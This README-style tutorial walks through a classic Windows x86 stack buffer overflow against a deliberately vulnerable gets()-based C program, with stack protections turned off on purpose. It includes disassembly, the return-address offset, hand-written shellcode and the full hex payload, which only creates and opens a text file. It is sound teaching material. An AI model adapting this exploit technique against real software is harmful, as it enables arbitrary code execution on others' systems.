## Bufferoverflow attack demonstration
## Prerequisites:
1. ollydbg
2. Windows x64 (x86)
3. Microsoft Visual Studio Developer Command Prompt x86
4. CFF Explorer
## x86 Assembler Information
- For bufferoverflow attack understanding we need know:
* ESP (Extended Stack Pointer): This register holds the memory address of the top of the stack, which is used for storing temporary data and function calls. When data is pushed onto the stack, the stack pointer decreases; when data is popped off the stack, the stack pointer increases.

* EBP (Extended Base Pointer): This register is used as a reference point for accessing parameters and local variables on the stack. It typically points to the base of the current function's stack frame. When a function is called, the EBP register is typically pushed onto the stack, and then a new frame is created by adjusting the stack pointer and setting EBP to the new base of the stack frame.

* EIP (Extended Instruction Pointer): This register holds the memory address of the next instruction to be executed in the program. It is automatically updated by the processor as instructions are executed. Control flow instructions, such as jumps and calls, modify the EIP register to change the sequence of instructions executed.
## Writing vulnerable program
- It's a step by step guide how to carry out bufferflow attack using vulnerability of **C gets()** function.
- First of all I will write a short program, that only takes user's name from standart input and prints it to standart output using **gets()** and **printf()** and 24-bytes static char buffer.
```C
#include <stdio.h>

int main (int argc, char ** argv) {
    char buffer[24];
    printf("Enter name: ");
    gets(buffer);
    printf("Hello, %s\n", buffer);
    }
```
* Compile this program using VS Developer Command Prompt x86 **cl main.cpp /GS-**
**/GS-** means to turn off security canaries (special generated random values that are located between function frame and return address on stack). It will make our attack easier.
## Analyse of program
* So now we have executable file "main.exe". Let's examine it properly. 

![Alt text](https://github.com/kirleo2/bufferoverflow-attack/blob/main/Screenshots/s1.png?raw=true "cmd")
* If we enter short input, for example: "Kirill", everything is ok. But if we will try to enter some long input, program will crash. We can find out in using Event Viewer **evenvwr** command in cmd.
![Alt text](https://github.com/kirleo2/bufferoverflow-attack/blob/main/Screenshots/crash.png?raw=true "Event Viewer")
* To find out the crash cause, let's open our program using debugger OllyDbg. In rigth upper corner we can see values of already explained registers. Let's repeat our input, that caused program's crash, and look into registers values. (F9 - program run)
![Alt text]("C:\Users\leonokir\Docs\Screenshots\registers.png" "Registers")
* As we can see, now in register EBP and EIP are ASCII values of our input's letters. And program tries to jump on invalid adress that causes it's crash. How are these values get into registers? Let's examine stack while executing of main function. Stack is located on right bottom corner.
* Code of main function is located on the top of all instructions. So let set the breakpoint on adress **00401000**.
```Assembly x86
00401000  /$ 55             PUSH EBP
00401001  |. 8BEC           MOV EBP,ESP
00401003  |. 83EC 18        SUB ESP,18
00401006  |. 68 00A04100    PUSH main.0041A000                       ; /Arg1 = 0041A000 ASCII "Enter name: "
0040100B  |. E8 70000000    CALL main.00401080                       ; \main.00401080
00401010  |. 83C4 04        ADD ESP,4
00401013  |. 8D45 E8        LEA EAX,DWORD PTR SS:[EBP-18]
00401016  |. 50             PUSH EAX                                 ; /Arg1
00401017  |. E8 C6310000    CALL main.004041E2                       ; \main.004041E2
0040101C  |. 83C4 04        ADD ESP,4
0040101F  |. 8D4D E8        LEA ECX,DWORD PTR SS:[EBP-18]
00401022  |. 51             PUSH ECX                                 ; /Arg2
00401023  |. 68 10A04100    PUSH main.0041A010                       ; |Arg1 = 0041A010 ASCII "Hello, %s
"
00401028  |. E8 53000000    CALL main.00401080                       ; \main.00401080
0040102D  |. 83C4 08        ADD ESP,8
00401030  |. 33C0           XOR EAX,EAX
00401032  |. 8BE5           MOV ESP,EBP
00401034  |. 5D             POP EBP
00401035  \. C3             RETN
```
- We can assume that the instruction 00401003  |. 83EC 18        SUB ESP,18 is our 24-bytes buffer allocation. 
* 0040100B  |. E8 70000000    CALL main.00401080 is call of first printf()
* 00401017  |. E8 C6310000    CALL main.004041E2 is gets() call
* 00401028  |. E8 53000000    CALL main.00401080 is second printf() call
- After several program runs, we can notice, that the addresses on the stack are always different, that makes our stack analyse more complicated.
* It's the security concept called ASLR. Address space layout randomization (ASLR) is a technique that is used to increase the difficulty of performing a buffer overflow attack that requires the attacker to know the location of an executable in memory.
- Let's turn it off using CFF Explorer. We need to open our "main.exe" and change the Optional Header value of "DllCharacteristics". DLL can move is ASLR flag and Image is NX compatible is flag to set non-executable stack. We will turn them both off.
![Alt text]("C:\Users\leonokir\Docs\Screenshots\cff.png" "CFF Explorer")
- After made changes, let's run program with OllyDbg again. Now we can see, that addresses on stack are always the same. So we can make a atck snapshot on the start and the end of main function.
* On my system **(it can changes depending on the running system)** now the ESP points on 0x0019FF2C address **(there is located return address on function that is before main)** before execution of instruction 00401000  /$ 55             PUSH EBP and on 0x0019FF10 **(beginning of our buffer)** before execution of 00401032  |. 8BE5           MOV ESP,EBP. 
![Alt text]("C:\Users\leonokir\Docs\Screenshots\stack.png" "Stack snapshot")
## The main idea of bufferoverflow
- Function gets() doesn't have any information about the buffer size. So it will rewrite stack memory with size of input. It leads to rewriting values that are located directly after buffer. As we noticed directly after buffer on stack are located EBP register backup (result of 00401000  /$ 55             PUSH EBP) and return address. The main idea is to rewrite the value of return address with our address, where we can place our code (placed using this input too).
## Exploit
- Let's try to make some smarter input to recognize on which bytes of our input is return address overflowed. **0123456789abcdefghijklmnopqrstuvwxyz** After this input we can notice that the value of return address in now ASCII represantation of "stuv". Now we can design our exploit:
* 28-bytes filling|address 0019FF2C + 4 (0019FF30)|exploit code. So we will rewrite return address with address that is directly next and at once will begin our code.
- There are two ways as we can put our input:
1. Using file as standart input.
2. Using console.
- I will do it using file, because it is more easier to realize. Using hexeditor we can put any bytes in it and then run program using: main.exe < file
- The exploit will consist of creating a text file "output.txt" by exploiting a stack overflow, writing the string "Buffer overflow is cool" to it, and then opening the file. To do this, we will need four functions from the Kernel32.dll library:

1. CreateFileA (to create the file)
2. WriteFile (to write data to the file)
3. CloseHandle (to close the file)
4. WinExec (to open the file with notepad)
Their addresses can be obtained by manually loading the Kernel32.dll and calling getProcAddr() on each function. Under normal circumstances, this will always work because "kernel32.dll" is always present and accessible in the Windows system and is necessary for the functioning of almost all programs.
* Determination of system function addresses:
```C
#include <windows.h>
#include <stdio.h>

int main()
{
    HMODULE hKernel32 = LoadLibrary("Kernel32.dll");

    if (hKernel32 == NULL)
    {
        printf("Error: Unable to load Kernel32.dll.\n");
        return 1;
    }

    FARPROC pCreateFileA = GetProcAddress(hKernel32, "CreateFileA");
    FARPROC pWriteFile = GetProcAddress(hKernel32, "WriteFile");
    FARPROC pCloseHandle = GetProcAddress(hKernel32, "CloseHandle");
    FARPROC pWinExec = GetProcAddress(hKernel32, "WinExec");
    if (pCreateFileA == NULL)
    {
        printf("Error: Unable to find CreateFileA function.\n");
        return 1;
    }
    if (pCloseHandle == NULL)
    {
        printf("Error: Unable to find CloseHandle function.\n");
        return 1;
    }
    if (pWriteFile == NULL)
    {
        printf("Error: Unable to find WriteFile function.\n");
        return 1;
    }
    if (pWinExec == NULL) {
        printf("Error: Unable to find WinExec function.\n");
        return 1;
    }
    printf("Address of CreateFileA function: %p\n", pCreateFileA);
    printf("Address of CloseHandle function: %p\n", pCloseHandle);
    printf("Address of WriteFile function: %p\n", pWriteFile);
    printf("Address of WinExec function: %p\n", pWinExec);
    FreeLibrary(hKernel32);
    return 0;
}
```
![Alt text]("C:\Users\leonokir\Docs\Screenshots\addr.png" "Addresses")
* Roughly exploit code in C
```C
#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hFile = CreateFileA("output.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // Create a new file
    const char* data = "Buffer overflow is cool!"; // Data to write to the file
    DWORD bytesWritten = 0;
    WriteFile(hFile, data, 24, &bytesWritten, NULL); // Write data to the file
    CloseHandle(hFile); // Close the file handle
    WinExec("notepad.exe output.txt", SW_SHOW);
    return 0;
}
```
- After finding out the addresses of the necessary instructions, it is possible to write the code in assembler. (Depending on different computers, basically only the instructions marked in red can change).
* To find out instruction encoding, we can use OllyDbg. With double-clicking on any instruction we can change it and see the new encoding.
![Alt text]("C:\Users\leonokir\Docs\Screenshots\encoding.png" "OllyDbg")
Assembly x86
BA <span style="color:red;">00389A75</span>    MOV EDX,KERNEL32.CreateFileA   
// push „output.txt“
68 78740000    PUSH 7478
68 75742E74    PUSH 742E7475
68 6F757470    PUSH 7074756F
8BCC           MOV ECX,ESP
6A 00          PUSH 0  | hTemplateFile = NULL
68 80000000    PUSH 80  |Attributes = NORMAL
6A 02          PUSH 2  |Mode = CREATE_ALWAYS
6A 00          PUSH 0  ; |pSecurity = NULL
6A 00          PUSH 0  ; |ShareMode = 0
68 00000040    PUSH 40000000 |Access = GENERIC_WRITE
51             PUSH ECX FileName = "output.txt"
FFD2           CALL EDX  KERNEL32.CreateFileA // This function writes the FileHandle to the EAX register
// Push „Buffer overflow is cool“
68 6F6F6C00    PUSH 6C6F6F
68 69732063    PUSH 63207369
68 6C6F7720    PUSH 20776F6C
68 76657266    PUSH 66726576
68 6572206F    PUSH 6F207265
68 42756666    PUSH 66667542
8BCC           MOV ECX,ESP 
68 78563412    PUSH 12345678  // we push some 4 byte value on the stack and pass the address on it using ESP
8BFC           MOV EDI,ESP
50             PUSH EAX // save FileHandle
6A 00          PUSH 0  ; /pOverlapped = NULL
57             PUSH EDI ; |pBytesWritten
6A 18          PUSH 18 ; |nBytesToWrite = 18 (24.)
51             PUSH ECX ; |Buffer
50             PUSH EAX ; |hFile
BA <span style="color:red;">803C9A75</span>    MOV EDX,KERNEL32.WriteFile 
FFD2           CALL EDX
58             POP EAX
50             PUSH EAX / FileHandle
BA <span style="color:red;">B0359A75</span>    MOV EDX,KERNEL32.CloseHandle
FFD2           CALL EDX
BA <span style="color:red;">F0E19D75</span>    MOV EDX,KERNEL32.WinExec
//push „notepad.exe output.txt“
009D1066     68 78740000    PUSH 7478
009D106B     68 75742E74    PUSH 742E7475
009D1070     68 6F757470    PUSH 7074756F
009D1075     68 65786520    PUSH 20657865
009D107A     68 7061642E    PUSH 2E646170
009D107F     68 6E6F7465    PUSH 65746F6E
009D1084     8BCC           MOV ECX,ESP
009D1086     6A 05          PUSH 5 // uCmdShow
// SW_SHOW	Activates the window and displays it in its current size and position.
009D1088     51             PUSH ECX // lpCmdLine
009D1089     FFD2           CALL EDX

- Now we have hexadicimal code of out exploit 30 31 32 33 34 35 36 37 38 39 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 30 FF 19 00 BA 00 38 9A 75 68 78 74 00 00 68 75 74 2E 74 68 6F 75 74 70 8B CC 6A 00 68 80 00 00 00 6A 02 6A 00 6A 00 68 00 00 00 40 51 FF D2 68 6F 6F 6C 00 68 69 73 20 63 68 6C 6F 77 20 68 76 65 72 66 68 65 72 20 6F 68 42 75 66 66 8B CC 68 78 56 34 12 8B FC 50 6A 00 57 6A 18 51 50 BA 80 3C 9A 75 FF D2 58 50 BA B0 35 9A 75 FF D2 BA F0 E1 9D 75 68 78 74 00 00 68 75 74 2E 74 68 6F 75 74 70 68 65 78 65 20 68 70 61 64 2E 68 6E 6F 74 65 8B CC 6A 05 51 FF D2
that we can write to the file using any hex editor. For example HxD program.
![Alt text]("C:\Users\leonokir\Docs\Screenshots\hex.png" "HxD")


